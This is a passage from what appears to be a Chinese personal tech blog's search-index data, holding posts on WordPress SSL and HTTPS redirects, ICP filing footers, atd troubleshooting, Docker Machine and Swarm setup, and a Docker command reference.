给七牛云的域名配置ssl证书\n","permalink":"https://www.lvbibir.cn/posts/blog/wordpress_load_image_failed/","summary":"现象 博客加载不出来我在七牛云的图片资源 使用浏览器直接访问图片url却是可以成功的 我将之前csdn的博客迁移到了wordpress，图片外链地","title":"wordpress加载图片失败"},{"content":"文章编辑界面和预览界面都是没问题的，发布出来后文章内容的http变成了https，而且仅有本博客域名lvbibir.cn出现这种情况，其他都正常\n发布后：\n初步判断是由于在wordpress的伪静态文件中配置了http强制跳转导致的\n","permalink":"https://www.lvbibir.cn/posts/blog/wordpress_editpage_different_post/","summary":"文章编辑界面和预览界面都是没问题的，发布出来后文章内容的http变成了https，而且仅有本博客域名lvbibir.cn出现这种情况，其他都","title":"wordpress文章编辑页和发不出来内容不一样（http变成了https）"},{"content":"默认主题下在后台设置里修改即可\n自定义主题或者其他主题需要修改footer.php文件\n在\u0026lt;footer\u0026gt;\u0026lt;/footer\u0026gt;中添加如下代码\n\u0026lt;div style=\u0026#34;text-align:center\u0026#34;\u0026gt; \u0026lt;a href=\u0026#34;http://beian.miit.gov.cn/\u0026#34; rel=\u0026#34;external nofollow\u0026#34; target=\u0026#34;_blank\u0026#34;\u0026gt; \u0026lt;?php echo get_option( \u0026#39;zh_cn_l10n_icp_num\u0026#39; ); ?\u0026gt; \u0026lt;/a\u0026gt; \u0026lt;/div\u0026gt; dux主题修改方式：在后台管理→dux主题编辑器→网站底部信息中添加\n\u0026lt;a href=\u0026#34;http://beian.miit.gov.cn/\u0026#34; rel=\u0026#34;external nofollow\u0026#34; target=\u0026#34;_blank\u0026#34;\u0026gt;京ICP备2021023168号-1\u0026lt;/a\u0026gt; ","permalink":"https://www.lvbibir.cn/posts/blog/wordpress_add_icp/","summary":"默认主题下在后台设置里修改即可 自定义主题或者其他主题需要修改footer.php文件 在\u0026lt;footer\u0026gt;\u0026lt;/footer\u0026g","title":"wordpress添加icp备案号"},{"content":"本文介绍如何在阿里轻量服务器wordpress站点配置http强制跳转到https\n配置强制跳转前需要站点已经安装了ssl证书，可以通过https正常访问\n[阿里云wordpress配置免费ssl证书]\n一般站点需要在httpd.conf中的\u0026lt;VirtualHost *:80\u0026gt; \u0026lt;/VirtualHost\u0026gt;中配置重定向\n与一般站点不同，wordpress需要在伪静态文件（.htaccess）中配置重定向，无需在httpd.conf中配置\n修改伪静态文件（.htaccess） 伪静态文件一般在网页根目录，是一个隐藏文件\n在#END Wordpress前添加如下重定向代码，记得把域名修改成自己的\nRewriteEngine On RewriteCond %{HTTPS} !on RewriteRule ^(.*)$ https://lvbibir.cn/%{REQUEST_URI} [L,R=301] 图中两段重定向代码略有不同\n第一段代码重定向触发器：当访问的端口不是443时进行重定向重定向规则：重定向到：https://{原域名}/{原url资源} 第二段代码重定向触发器：当访问的协议不是 TLS/SLL（https）时进行重定向重定向规则：重定向到：https://lvbibir.cn/{原url资源} 第一段代码使用端口判断，第二段代码通过访问方式判断，建议使用访问方式判断，这样服务改了端口也可以正常跳转 第一段代码重定向的原先的域名，第二段代码可以把ip地址重定向到指定域名 测试 curl -I http://lvbibir.cn 使用http访问站点的80端口成功通过301跳转到了https\n参考 https://help.aliyun.com/document_detail/98727.html?spm=5176.smartservice_service_chat.0.0.1508709aJMmZwg\nhttps://blog.csdn.net/weixin_39037804/article/details/102801202\n","permalink":"https://www.lvbibir.cn/posts/blog/wordpress_https/","summary":"本文介绍如何在阿里轻量服务器wordpress站点配置http强制跳转到https 配置强制跳转前需要站点已经安装了ssl证书，可以通过htt","title":"wordpress配置https强制跳转"},{"content":"1、购买免费证书 2、补全域名信息 3、域名验证 根据在域名提供商处新建解析\ndns配置好之后等待CA机构审核后颁发证书就可以了\n4、 为域名开启https 5、修改PicGo的配置 ","permalink":"https://www.lvbibir.cn/posts/blog/qiniu_ssl/","summary":"1、购买免费证书 2、补全域名信息 3、域名验证 根据在域名提供商处新建解析 dns配置好之后等待CA机构审核后颁发证书就可以了 4、 为域名开启htt","title":"七牛云配置免费ssl证书"},{"content":"1、登录阿里云，选择产品中的ssl证书\n如果域名是阿里的他会自动创建dns解析，如果是其他厂商需要按照图片配置，等待几分钟进行验证\n点击审核，等待签发\n签发后根据需求下载所需证书\n我的wordpress是直接买的阿里轻量应用服务器，打开轻量应用服务器的控制台配置域名\n选择刚申请好的ssl证书\n在wordpress后台修改地址\n大功告成\n","permalink":"https://www.lvbibir.cn/posts/blog/wordpress_ssl/","summary":"1、登录阿里云，选择产品中的ssl证书 如果域名是阿里的他会自动创建dns解析，如果是其他厂商需要按照图片配置，等待几分钟进行验证 点击审核，等","title":"阿里云wordpress配置免费ssl证书"},{"content":"有需求需要测试下 at 单次计划任务，系统环境 isoftserveros-v5.1-oe1-aarch64\n系统默认没有at软件包，使用本地yum源安装：\nyum -y install at 安装完后不小心执行了下atd\natd 因为at计划任务需要atd守护进程运行\nsystemctl start atd systemctl enable atd 开始测试at计划任务，发现无论如何就是不执行 开始进行排查 在Process行可以看到atd的后台进程是通过命令 /usr/sbin/atd -f $OPTS 运行的\n发现了之前手动执行的atd，这个时候systemctl restart atd也无法杀死这个进程并开启新的守护进程\n尝试kill掉这个进程，再起atd服务\nkill 27337 systemctl restart atd systemctl status atd 已经正常运行了\n","permalink":"https://www.lvbibir.cn/posts/tech/atd_failed_with_result_exit_code/","summary":"有需求需要测试下 at 单次计划任务，系统环境 isoftserveros-v5.1-oe1-aarch64 系统默认没有at软件包，使用本地yum源安装： yum -y install at 安装完后不小心执行了下atd atd 因为at计划任","title":"atd服务报错 Failed with result ‘exit-code’"},{"content":"Docker Machine简介 Docker Machine 是 Docker 官方编排（Orchestration）项目之一，负责在多种平台上快速安装 Docker环境。 Docker Machine支持在常规Linux操作系统、虚拟化平台、openstack、公有云等不同环境下安装配置dockerhost。 Docker Machine 项目基于 Go 语言实现，目前在 Github 上的维护地址：https://github.com/docker/machine/\nDocker Machine实践 环境准备 三台centos7，两台新系统，一台装有docker ip： machine：192.168.1.101 host1:192.168.1.127 host2:192.168.1.180 保证三台centos7可以连接到外网 下载并安装machine base=https://github.com/docker/machine/releases/download/v0.14.0 \u0026amp;\u0026amp; curl -L $base/docker-machine-$(uname -s)-$(uname -m) \u0026gt;/tmp/docker-machine \u0026amp;\u0026amp; sudo install /tmp/docker-machine /usr/local/bin/docker-machine\t下载并安装doker-machine，路径在/usr/local/bin下\n创建machine machine指的是docker daemon主机，其实就是在host上安装和部署docker。\n创建流程： 安装docker软件包 ssh免密登陆远程主机 复制证书 配置docker daemon 启动docker 创建machine要求免密登录远程主机 ssh-keygen ssh-copy-id 目标ip [root@server5 ~]# ssh-keygen [root@server5 ~]# ssh-copy-id 192.168.1.127 [root@server5 ~]# ssh-copy-id 192.168.1.180 测试：\nssh 192.168.1.127 ssh 192.168.1.180 创建主机（离线安装需要在目标主机提前安装好docker软件包） docker-machine create --driver generic --generic-ip-address=192.168.1.127 host1 参考 docker三剑客之machine\n","permalink":"https://www.lvbibir.cn/posts/tech/docker_machine/","summary":"Docker Machine简介 Docker Machine 是 Docker 官方编排（Orchestration）项目之一，负责在多种平台上快速安装 Docker环境。 Docker Machine支持在","title":"docker三剑客之machine"},{"content":"docker swarm 概述 https://blog.csdn.net/anumbrella/article/details/80369913\ndocker swarm 使用 环境搭建 准备3台Ubuntu系统主机(即用于搭建集群的3个Docker机器)，每台机器上都需要安装Docker并且可以连接网络，同时要求Docker版本必须是1.12及以上，因为老版本不支持Docker Swarm 集群管理节点Docker机器的IP地址必须固定，集群中所有节点都能够访问该管理节点。 集群节点之间必须使用相应的协议并保证其以下端口可用： 1. 用于集群管理通信的TCP端口2377； 2. TCP 和UDP 端口7946，用于节点间的通信； 3. UDP 端口 4789，用于覆盖网络流量 为了进行本实例演示，此处按照要求安装了3台使用centos7.4系统的机器，这三台机器的主机名称分别为manager1(作为管理节点)，worker1(作为工作节点)，worker2(作为工作节点),其IP地址分别如下：\n主机名 IP地址 manager 192.168.0.101 worker-1 192.168.0.102 worker-2 192.168.0.103 创建 Docker Swarm集群 在 manager 上创建 swarm 集群 [root@node-1 ~]# docker swarm init --advertise-addr 192.168.0.101 使用 docker node ls 查看集群节点信息 [root@manager ~]# docker node ls 向 Docker Swarm集群添加工作节点 在 worker1 和 worker2 中执行米慧玲，加入 swarm 集群 docker swarm join --token SWMTKN-1-2zhqxsklcroivbpjzzntn5snsim79o5z7xzj4hzexk9phsz68q-d0seaxjgxpjebk8fdqt6d6yz5 192.168.0.101:2377 2. 在管理节点上，使用 docker node ls 查看集群节点信息\n[root@manager ~]# docker node ls 向 Docker Swarm集群部署服务 在向 docker swarm 集群中部署服务时，既可以使用 docker hub 上自带的镜像来启动服务，也可以自己通过 dockerfile 的镜像来启动服务，如果使用自己的 dockerfile 构建的镜像来启动服务，那么必须先将镜像推送到 docker hub 中心仓库 这里，我们使用 docker hub 上自带的 alpine 镜像为例来部署集群服务\n[root@manager ~]# docker service create --replicas 1 --name helloworld alpine ping docker.com 查看Docker Swarm 集群中的服务 当服务部署完成后，在管理节点上可以通过 docker service ls 查看当前集群中的服务列表信息 [root@manager ~]# docker service ls 使用 docker service inspect 查看部署的服务具体详情 [root@manager ~]# docker service inspect helloworl 使用 docker service ps 查看指定服务在集群节点上的分配和运行情况 [root@manager ~]# docker service ps helloworld 更改 Docker Swarm 集群服务样本数量 在集群中部署的服务，如果只运行一个副本，就无法体现出集群的优势，并且一旦该机器或副本崩溃，该服务将无法访问，所以通常一个服务会启动多个副本\n[root@manager ~]# docker service scale helloworld=5 更改完成后，就可以谈过 docker service ps 查看这五个服务副本在3个节点上的具体分布和运行情况 [root@manager ~]# docker service ps helloworld 删除服务 对于不需要的服务，我们可以进行删除\n[root@manager ~]# docker service rm helloworld 访问服务 在管理节点上，执行 docker network ls 查看网络列表 [root@manager ~]# docker network ls 在管理节点上，创建 overlay 网络 [root@manager ~]# docker network create -d overlay ov_net 在管理节点上，再次部署服务 [root@manager ~]# docker service create --network ov_net --name my-web --publish 8080:80 --replicas 2 nginx 访问 nginx 服务 参考 docker swarm删除节点（解散集群） 截取已创建好的 swarm 集群的 token\n","permalink":"https://www.lvbibir.cn/posts/tech/docker_swarm/","summary":"docker swarm 概述 https://blog.csdn.net/anumbrella/article/details/80369913 docker swarm 使用 环境搭建 准备3台Ubuntu系统主机(即用于搭建集群的3个Docker机器)，每台机器上都需要安装Docker并且可以连接","title":"docker三剑客之swarm"},{"content":"docker info\u0026mdash;\u0026ndash;查看docker的各项信息 查看docke的各项操作，包括docker版本、容器数量、镜像数量、仓库地址、镜像存放位置等 容器操作 docker run\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026ndash;创建并启动一个新的容器 docker run ：创建一个新的容器并运行一个命令 语法\ndocker run [OPTIONS] IMAGE [COMMAND] [ARG\u0026hellip;]\nOPTIONS说明：\n-a stdin: 指定标准输入输出内容类型，可选 STDIN/STDOUT/STDERR 三项； -d: 后台运行容器，并返回容器ID； -i: 以交互模式运行容器，通常与 -t 同时使用； -P: 随机端口映射，容器内部端口随机映射到主机的高端口 -p: 指定端口映射，格式为：主机(宿主)端口:容器端口 1. 只指定容器端口（宿主机端口随机映射） docker run -p 80 -it ubuntu /bin/bash 2. 主机端口：容器端口 docker run -p 8080:80 -it ubuntu /bin/bash 3. IP：容器端口 docker run -p 0.0.0.0:80 -it ubuntu /bin/bash 4. IP：端口：容器端口 dokcer run -p 0.0.0.0:8080:80 -it ubuntu /bin/bash -t: 为容器重新分配一个伪输入终端，通常与 -i 同时使用； --name=\u0026quot;nginx-lb\u0026quot;: 为容器指定一个名称； --dns 8.8.8.8: 指定容器使用的DNS服务器，默认和宿主一致； --dns-search example.com: 指定容器DNS搜索域名，默认和宿主一致； -h \u0026quot;mars\u0026quot;: 指定容器的hostname； -e username=\u0026quot;ritchie\u0026quot;: 设置环境变量； -env-file=[]: 从指定文件读入环境变量； --cpuset=\u0026quot;0-2\u0026quot; or --cpuset=\u0026quot;0,1,2\u0026quot;: 绑定容器到指定CPU运行； -m :设置容器使用内存最大值； --net=\u0026quot;bridge\u0026quot;: 指定容器的网络连接类型，支持 bridge/host/none/container: 四种类型； --link=[]: 添加链接到另一个容器； --expose=[]: 开放一个端口或一组端口； --volume , -v: 绑定一个卷 实例\n使用docker镜像nginx:latest以后台模式启动一个容器,并将容器命名为mynginx。\ndocker run --name mynginx -d nginx:latest 使用镜像nginx:latest以后台模式启动一个容器,并将容器的80端口映射到主机随机端口。\ndocker run -P -d nginx:latest 使用镜像 nginx:latest，以后台模式启动一个容器,将容器的 80 端口映射到主机的 80 端口,主机的目录 /data 映射到容器的 /data。\ndocker run -p 80:80 -v /data:/data -d nginx:latest 绑定容器的 8080 端口，并将其映射到本地主机 127.0.0.1 的 80 端口上。\ndocker run -p 127.0.0.1:80:8080/tcp ubuntu bash 使用镜像nginx:latest以交互模式启动一个容器,在容器内执行/bin/bash命令。\nrunoob@runoob:~$ docker run -it nginx:latest /bin/bash root@b8573233d675:/# docker ps\u0026mdash;\u0026mdash;\u0026mdash;-查看容器 docker ps : 列出容器 语法\ndocker ps [OPTIONS]\nOPTIONS说明：\n-a :显示所有的容器，包括未运行的。 -f :根据条件过滤显示的内容。 --format :指定返回值的模板文件。 -l :显示最近创建的容器。 -n :列出最近创建的n个容器。 --no-trunc :不截断输出。 -q :静默模式，只显示容器编号。 -s :显示总的文件大小。 实例\n列出所有在运行的容器信息。\nrunoob@runoob:~$ docker ps CONTAINER ID IMAGE COMMAND ... PORTS NAMES 09b93464c2f7 nginx:latest \u0026quot;nginx -g 'daemon off\u0026quot; ... 80/tcp, 443/tcp myrunoob 96f7f14e99ab mysql:5.6 \u0026quot;docker-entrypoint.sh\u0026quot; ... 0.0.0.0:3306-\u0026gt;3306/tcp mymysql 列出最近创建的5个容器信息。\nrunoob@runoob:~$ docker ps -n 5 CONTAINER ID IMAGE COMMAND CREATED 09b93464c2f7 nginx:latest \u0026quot;nginx -g 'daemon off\u0026quot; 2 days ago ... b8573233d675 nginx:latest \u0026quot;/bin/bash\u0026quot; 2 days ago ... b1a0703e41e7 nginx:latest \u0026quot;nginx -g 'daemon off\u0026quot; 2 days ago ... f46fb1dec520 5c6e1090e771 \u0026quot;/bin/sh -c 'set -x \\t\u0026quot; 2 days ago ... a63b4a5597de 860c279d2fec \u0026quot;bash\u0026quot; 2 days ago ... 列出所有创建的容器ID。\nrunoob@runoob:~$ docker ps -a -q 09b93464c2f7 b8573233d675 b1a0703e41e7 f46fb1dec520 a63b4a5597de 6a4aa42e947b de7bb36e7968 43a432b73776 664a8ab1a585 ba52eb632bbd docker inspect\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;查看某个容器的详细信息 docker inspect : 获取容器/镜像的元数据。 语法\ndocker inspect [OPTIONS] NAME|ID [NAME|ID\u0026hellip;]\nOPTIONS说明：\n-f :指定返回值的模板文件。 -s :显示总的文件大小。 --type :为指定类型返回JSON。 实例\n获取镜像mysql:5.6的元信息。\nrunoob@runoob:~$ docker inspect mysql:5.6 [ { \u0026quot;Id\u0026quot;: \u0026quot;sha256:2c0964ec182ae9a045f866bbc2553087f6e42bfc16074a74fb820af235f070ec\u0026quot;, \u0026quot;RepoTags\u0026quot;: [ \u0026quot;mysql:5.6\u0026quot; ], \u0026quot;RepoDigests\u0026quot;: [], \u0026quot;Parent\u0026quot;: \u0026quot;\u0026quot;, \u0026quot;Comment\u0026quot;: \u0026quot;\u0026quot;, \u0026quot;Created\u0026quot;: \u0026quot;2016-05-24T04:01:41.168371815Z\u0026quot;, \u0026quot;Container\u0026quot;: \u0026quot;e0924bc460ff97787f34610115e9363e6363b30b8efa406e28eb495ab199ca54\u0026quot;, \u0026quot;ContainerConfig\u0026quot;: { \u0026quot;Hostname\u0026quot;: \u0026quot;b0cf605c7757\u0026quot;, \u0026quot;Domainname\u0026quot;: \u0026quot;\u0026quot;, \u0026quot;User\u0026quot;: \u0026quot;\u0026quot;, \u0026quot;AttachStdin\u0026quot;: false, \u0026quot;AttachStdout\u0026quot;: false, \u0026quot;AttachStderr\u0026quot;: false, \u0026quot;ExposedPorts\u0026quot;: { \u0026quot;3306/tcp\u0026quot;: {} }, ... 获取正在运行的容器mymysql的 IP。\nrunoob@runoob:~$ docker inspect --format='{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' mymysql 172.17.0.3 docker start/stop/restart\u0026mdash;\u0026mdash;开启、关闭、重启一个容器 docker start :启动一个或多个已经被停止的容器\ndocker stop :停止一个运行中的容器\ndocker restart :重启容器\n语法\ndocker start [OPTIONS] CONTAINER [CONTAINER\u0026hellip;]\ndocker stop [OPTIONS] CONTAINER [CONTAINER\u0026hellip;]\ndocker restart [OPTIONS] CONTAINER [CONTAINER\u0026hellip;]\n实例\n启动已被停止的容器myrunoob\ndocker start myrunoob 停止运行中的容器myrunoob\ndocker stop myrunoob 重启容器myrunoob\ndocker restart myrunoob docker rm\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026ndash;删除一个已经停止的容器容器 docker rm ：删除一个或多少容器 语法\ndocker rm [OPTIONS] CONTAINER [CONTAINER\u0026hellip;]\nOPTIONS说明：\n-f :通过SIGKILL信号强制删除一个运行中的容器 -l :移除容器间的网络连接，而非容器本身 -v :-v 删除与容器关联的卷 实例\n强制删除容器db01、db02\ndocker rm -f db01 db02 移除容器nginx01对容器db01的连接，连接名db\ndocker rm -l db 删除容器nginx01,并删除容器挂载的数据卷\ndocker rm -v nginx01 docker attach\u0026mdash;\u0026mdash;进入一个开启的容器中 docker attach :连接到正在运行中的容器。\n语法\ndocker attach [OPTIONS] CONTAINER\n要attach上去的容器必须正在运行，可以同时连接上同一个container来共享屏幕（与screen命令的attach类似）。\n官方文档中说attach后可以通过CTRL-C来detach，但实际上经过我的测试，如果container当前在运行bash，CTRL-C自然是当前行的输入，没有退出；如果container当前正在前台运行进程，如输出nginx的access.log日志，CTRL-C不仅会导致退出容器，而且还stop了。这不是我们想要的，detach的意思按理应该是脱离容器终端，但容器依然运行。好在attach是可以带上\u0026ndash;sig-proxy=false来确保CTRL-D或CTRL-C不会关闭容器。 实例\n容器mynginx将访问日志指到标准输出，连接到容器查看访问信息。\nrunoob@runoob:~$ docker attach --sig-proxy=false mynginx 192.168.239.1 - - [10/Jul/2016:16:54:26 +0000] \u0026quot;GET / HTTP/1.1\u0026quot; 304 0 \u0026quot;-\u0026quot; \u0026quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.93 Safari/537.36\u0026quot; \u0026quot;-\u0026quot; docker logs\u0026mdash;\u0026ndash;查看容器日志 docker logs : 获取容器的日志 语法\ndocker logs [OPTIONS] CONTAINER\nOPTIONS说明：\n-f : 跟踪日志输出 --since :显示某个开始时间的所有日志 -t : 显示时间戳 --tail :仅列出最新N条容器日志 实例\n跟踪查看容器mynginx的日志输出。\nrunoob@runoob:~$ docker logs -f mynginx 192.168.239.1 - - [10/Jul/2016:16:53:33 +0000] \u0026quot;GET / HTTP/1.1\u0026quot; 200 612 \u0026quot;-\u0026quot; \u0026quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.93 Safari/537.36\u0026quot; \u0026quot;-\u0026quot; 2016/07/10 16:53:33 [error] 5#5: *1 open() \u0026quot;/usr/share/nginx/html/favicon.ico\u0026quot; failed (2: No such file or directory), client: 192.168.239.1, server: localhost, request: \u0026quot;GET /favicon.ico HTTP/1.1\u0026quot;, host: \u0026quot;192.168.239.130\u0026quot;, referrer: \u0026quot;http://192.168.239.130/\u0026quot; 192.168.239.1 - - [10/Jul/2016:16:53:33 +0000] \u0026quot;GET /favicon.ico HTTP/1.1\u0026quot; 404 571 \u0026quot;http://192.168.239.130/\u0026quot; \u0026quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.93 Safari/537.36\u0026quot; \u0026quot;-\u0026quot; 192.168.239.1 - - [10/Jul/2016:16:53:59 +0000] \u0026quot;GET / HTTP/1.1\u0026quot; 304 0 \u0026quot;-\u0026quot; \u0026quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.93 Safari/537.36\u0026quot; \u0026quot;-\u0026quot; ... 查看容器mynginx从2016年7月1日后的最新10条日志。\ndocker logs --since=\u0026quot;2016-07-01\u0026quot; --tail=10 mynginx docker top\u0026mdash;\u0026ndash;查看容器内的进程 docker top :查看容器中运行的进程信息，支持 ps 命令参数。 语法\ndocker top [OPTIONS] CONTAINER [ps OPTIONS]\n容器运行时不一定有/bin/bash终端来交互执行top命令，而且容器还不一定有top命令，可以使用docker top来实现查看container中正在运行的进程。 实例\n查看容器mymysql的进程信息。\nrunoob@runoob:~/mysql$ docker top mymysql UID PID PPID C STIME TTY TIME CMD 999 40347 40331 18 00:58 ? 00:00:02 mysqld 查看所有运行容器的进程信息。\nfor i in `docker ps |grep Up|awk '{print $1}'`;do echo \\ \u0026amp;\u0026amp;docker top $i; done docker exec\u0026mdash;\u0026mdash;在容器中启动新的进程 docker exec ：在运行的容器中执行命令 语法\ndocker exec [OPTIONS] CONTAINER COMMAND [ARG\u0026hellip;]\nOPTIONS说明：\n-d :分离模式: 在后台运行 -i :即使没有附加也保持STDIN 打开 -t :分配一个伪终端 实例\n在容器 mynginx 中以交互模式执行容器内 /root/runoob.sh 脚本:\nrunoob@runoob:~$ docker exec -it mynginx /bin/sh /root/runoob.sh http://www.runoob.com/ 在容器 mynginx 中开启一个交互模式的终端:\nrunoob@runoob:~$ docker exec -i -t mynginx /bin/bash root@b1a0703e41e7:/# 也可以通过 docker ps -a 命令查看已经在运行的容器，然后使用容器 ID 进入容器。\n查看已经在运行的容器 ID：\ndocker ps -a ... 9df70f9a0714 openjdk \u0026quot;/usercode/script.sh…\u0026quot; ... 第一列的 9df70f9a0714 就是容器 ID。\n通过 exec 命令对指定的容器执行 bash:\ndocker exec -it 9df70f9a0714 /bin/bash dokcer kill\u0026mdash;\u0026ndash;停止容器 docker kill :杀掉一个运行中的容器。 语法\ndocker kill [OPTIONS] CONTAINER [CONTAINER\u0026hellip;]\nOPTIONS说明：\n-s :向容器发送一个信号 实例\n杀掉运行中的容器mynginx\nrunoob@runoob:~$ docker kill -s KILL mynginx mynginx 镜像操作 docker images\u0026mdash;\u0026mdash;-查看镜像 docker images : 列出本地镜像。 语法\ndocker images [OPTIONS] [REPOSITORY[:TAG]]\nOPTIONS说明：\n-a :列出本地所有的镜像（含中间映像层，默认情况下，过滤掉中间映像层）； --digests :显示镜像的摘要信息； -f :显示满足条件的镜像； --format :指定返回值的模板文件； --no-trunc :显示完整的镜像信息； -q :只显示镜像ID。 实例\n查看本地镜像列表。\nrunoob@runoob:~$ docker images REPOSITORY TAG IMAGE ID CREATED SIZE mymysql v1 37af1236adef 5 minutes ago 329 MB runoob/ubuntu v4 1c06aa18edee 2 days ago 142.1 MB \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; 5c6e1090e771 2 days ago 165.9 MB httpd latest ed38aaffef30 11 days ago 195.1 MB alpine latest 4e38e38c8ce0 2 weeks ago 4.799 MB mongo 3.2 282fd552add6 3 weeks ago 336.1 MB redis latest 4465e4bcad80 3 weeks ago 185.7 MB php 5.6-fpm 025041cd3aa5 3 weeks ago 456.3 MB python 3.5 045767ddf24a 3 weeks ago 684.1 MB ... 列出本地镜像中REPOSITORY为ubuntu的镜像列表。\nroot@runoob:~# docker images ubuntu REPOSITORY TAG IMAGE ID CREATED SIZE ubuntu 14.04 90d5884b1ee0 9 weeks ago 188 MB ubuntu 15.10 4e3b13c8a266 3 months ago 136.3 MB docker inspect\u0026mdash;\u0026mdash;-查看镜像或者容器的详细信息 docker inspect : 获取容器/镜像的元数据。 语法\ndocker inspect [OPTIONS] NAME|ID [NAME|ID\u0026hellip;]\nOPTIONS说明：\n-f :指定返回值的模板文件。 -s :显示总的文件大小。 --type :为指定类型返回JSON。 实例\n获取镜像mysql:5.6的元信息。\nrunoob@runoob:~$ docker inspect mysql:5.6 [ { \u0026quot;Id\u0026quot;: \u0026quot;sha256:2c0964ec182ae9a045f866bbc2553087f6e42bfc16074a74fb820af235f070ec\u0026quot;, \u0026quot;RepoTags\u0026quot;: [ \u0026quot;mysql:5.6\u0026quot; ], \u0026quot;RepoDigests\u0026quot;: [], \u0026quot;Parent\u0026quot;: \u0026quot;\u0026quot;, \u0026quot;Comment\u0026quot;: \u0026quot;\u0026quot;, \u0026quot;Created\u0026quot;: \u0026quot;2016-05-24T04:01:41.168371815Z\u0026quot;, \u0026quot;Container\u0026quot;: \u0026quot;e0924bc460ff97787f34610115e9363e6363b30b8efa406e28eb495ab199ca54\u0026quot;, \u0026quot;ContainerConfig\u0026quot;: { \u0026quot;Hostname\u0026quot;: \u0026quot;b0cf605c7757\u0026quot;, \u0026quot;Domainname\u0026quot;: \u0026quot;\u0026quot;, \u0026quot;User\u0026quot;: \u0026quot;\u0026quot;, \u0026quot;AttachStdin\u0026quot;: false, \u0026quot;AttachStdout\u0026quot;: false, \u0026quot;AttachStderr\u0026quot;: false, \u0026quot;ExposedPorts\u0026quot;: { \u0026quot;3306/tcp\u0026quot;: {} }, ... 获取正在运行的容器mymysql的 IP。\nrunoob@runoob:~$ docker inspect --format='{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' mymysql 172.17.0.3 docker rmi\u0026mdash;\u0026mdash;删除镜像 docker rmi : 删除本地一个或多少镜像。 语法\ndocker rmi [OPTIONS] IMAGE [IMAGE\u0026hellip;]\nOPTIONS说明：\n-f :强制删除； --no-prune :不移除该镜像的过程镜像，默认移除； 注：IMAGE可以使用[仓库：标签]的格式，也可以使用镜像ID，可以同时删除多个镜像 1、使用[仓库：标签]的格式：删除一个标签。当一个镜像文件有多个标签时，删除完所有的标签，镜像文件也随之删除 2、使用镜像ID的格式：先将该镜像文件的所有标签删除，再删除镜像文件\n删除所有镜像\ndocker rmi $(docker images -q) 删除某个仓库的所有镜像\ndocker rmi $(docker images -q ubuntu) 实例\n强制删除本地镜像 runoob/ubuntu:v4。\nroot@runoob:~# docker rmi -f runoob/ubuntu:v4 Untagged: runoob/ubuntu:v4 Deleted: sha256:1c06aa18edee44230f93a90a7d88139235de12cd4c089d41eed8419b503072be Deleted: sha256:85feb446e89a28d58ee7d80ea5ce367eebb7cec70f0ec18aa4faa874cbd97c73 docker search\u0026mdash;\u0026mdash;\u0026mdash;查找镜像 语法\ndocker search [OPTIONS] TERM\nOPTIONS说明：\n--automated :只列出 automated build类型的镜像； --no-trunc :显示完整的镜像描述； -s :列出收藏数不小于指定值的镜像。 实例\n从Docker Hub查找所有镜像名包含java，并且收藏数大于10的镜像\nrunoob@runoob:~$ docker search -s 10 java NAME DESCRIPTION STARS OFFICIAL AUTOMATED java Java is a concurrent, class-based... 1037 [OK] anapsix/alpine-java Oracle Java 8 (and 7) with GLIBC ... 115 [OK] develar/java 46 [OK] isuper/java-oracle This repository contains all java... 38 [OK] lwieske/java-8 Oracle Java 8 Container - Full + ... 27 [OK] nimmis/java-centos This is docker images of CentOS 7... 13 [OK] docker pull\u0026mdash;\u0026ndash;拉取镜像 docker pull [OPTIONS] NAME[:TAG|@DIGEST]\nOPTIONS说明：\n-a :拉取所有 tagged 镜像 --disable-content-trust :忽略镜像的校验,默认开启 实例\n从Docker Hub下载java最新版镜像。\ndocker pull java 从Docker Hub下载REPOSITORY为java的所有镜像。\ndocker pull -a java docker push\u0026mdash;-推送镜像 docker push : 将本地的镜像上传到镜像仓库,要先登陆到镜像仓库 语法\ndocker push [OPTIONS] NAME[:TAG]\nOPTIONS说明：\n--disable-content-trust :忽略镜像的校验,默认开启 实例\n上传本地镜像myapache:v1到镜像仓库中。\ndocker push myapache:v1 docker commit\u0026mdash;\u0026ndash;通过容器构建镜像 docker commit :从容器创建一个新的镜像。 语法\ndocker commit [OPTIONS] CONTAINER [REPOSITORY[:TAG]]\nOPTIONS说明：\n-a :提交的镜像作者； -c :使用Dockerfile指令来创建镜像； -m :提交时的说明文字； -p :在commit时，将容器暂停。 实例\n将容器a404c6c174a2 保存为新的镜像,并添加提交人信息和说明信息。\nrunoob@runoob:~$ docker commit -a \u0026quot;runoob.com\u0026quot; -m \u0026quot;my apache\u0026quot; a404c6c174a2 mymysql:v1 sha256:37af1236adef1544e8886be23010b66577647a40bc02c0885a6600b33ee28057 runoob@runoob:~$ docker images mymysql:v1 REPOSITORY TAG IMAGE ID CREATED SIZE mymysql v1 37af1236adef 15 seconds ago 329 MB docker build\u0026mdash;\u0026mdash;通过Dockerfile构建镜像 docker build 命令用于使用 Dockerfile 创建镜像。 语法\ndocker build [OPTIONS] PATH | URL | -\nOPTIONS说明：\n--build-arg=[] :设置镜像创建时的变量； --cpu-shares :设置 cpu 使用权重； --cpu-period :限制 CPU CFS周期； --cpu-quota :限制 CPU CFS配额； --cpuset-cpus :指定使用的CPU id； --cpuset-mems :指定使用的内存 id； --disable-content-trust :忽略校验，默认开启； -f :指定要使用的Dockerfile路径； --force-rm :设置镜像过程中删除中间容器； --isolation :使用容器隔离技术； --label=[] :设置镜像使用的元数据； -m :设置内存最大值； --memory-swap :设置Swap的最大值为内存+swap，\u0026quot;-1\u0026quot;表示不限swap； --no-cache :创建镜像的过程不使用缓存； --pull :尝试去更新镜像的新版本； --quiet, -q :安静模式，成功后只输出镜像 ID； --rm :设置镜像成功后删除中间容器； --shm-size :设置/dev/shm的大小，默认值是64M； --ulimit :Ulimit配置。 --tag, -t: 镜像的名字及标签，通常 name:tag 或者 name 格式；可以在一次构建中为一个镜像设置多个标签。 